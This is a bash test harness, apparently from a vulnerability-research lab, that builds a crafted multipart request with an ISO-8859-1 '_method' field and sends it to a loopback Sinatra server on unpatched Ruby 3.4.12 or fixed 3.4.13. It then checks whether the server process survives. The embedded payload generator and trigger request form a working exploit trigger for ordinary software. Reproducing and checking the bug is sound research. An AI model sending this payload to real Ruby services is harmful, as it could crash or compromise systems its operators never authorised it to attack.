#!/bin/bash
# Uninstrumented stock-Sinatra request/survival probe. Loopback only.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-stock-$MODE-1}"
N="${RUBY2SHELL_STOCK_N:-828}"
FILL="${RUBY2SHELL_STOCK_FILL:-6}"
ORDER="${RUBY2SHELL_STOCK_ORDER:-method-first}"
if [ "$MODE" = fixed ]; then
  RB="${3:-lab/build/plain/ruby-3.4.13-plain/bin/ruby}"
else
  RB="${3:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
fi
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
EV=lab/build/evidence
OUT="$EV/stock-baseline-$TAG.out"
LOG="$EV/stock-baseline-$TAG.server.log"
BODY="$EV/stock-baseline-$TAG.body"
PORT=4550
mkdir -p "$EV"
python3 - "$MODE" "$N" "$FILL" "$ORDER" > "$BODY" <<'PY'
import sys
mode, n, fill, order = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4]
data = b'\xdf' * n if mode == 'control' else b'a' + b'\xdf' * (n - 1)
method = (b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
          b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data)
filler = (b'\r\n--XB\r\nContent-Disposition: form-data; name="f"\r\n'
          b'Content-Type: text/plain\r\n\r\n' + (b'f' * fill))
if order == 'filler-first':
    body = b'--XB\r\nContent-Disposition: form-data; name="f"\r\nContent-Type: text/plain\r\n\r\n' + (b'f' * fill) + b'\r\n' + method
else:
    body = method + filler
sys.stdout.buffer.write(body + b'\r\n--XB--\r\n')
PY
if [ "${RUBY2SHELL_STOCK_TRACE:-0}" = 1 ]; then
  MTRACE_FD=2 LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" lab/repro/ruby2shell-stock-baseline.ru > "$LOG" 2>&1 &
else
  "$RB" lab/repro/ruby2shell-stock-baseline.ru > "$LOG" 2>&1 &
fi
PID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then
    READY=YES
    break
  fi
  sleep 0.1
done
{
  echo "== $TAG mode=$MODE ruby=$RB $(date -u +%H:%M:%SZ)"
  echo "ready=$READY"
  echo '-- malicious/safe trigger:'
  curl -s -m 20 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' \
    --data-binary "@$BODY" -w '\nTRIGGER_HTTP=%{http_code}\n'
  echo '-- later request:'
  curl -s -m 5 "http://127.0.0.1:$PORT/" -w '\nALIVE_HTTP=%{http_code}\n'
} > "$OUT" 2>&1
if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
kill "$PID" 2>/dev/null
wait "$PID" 2>/dev/null
RC=$?
cat "$OUT"
echo "process-alive-after-later-request=$ALIVE server-rc=$RC"
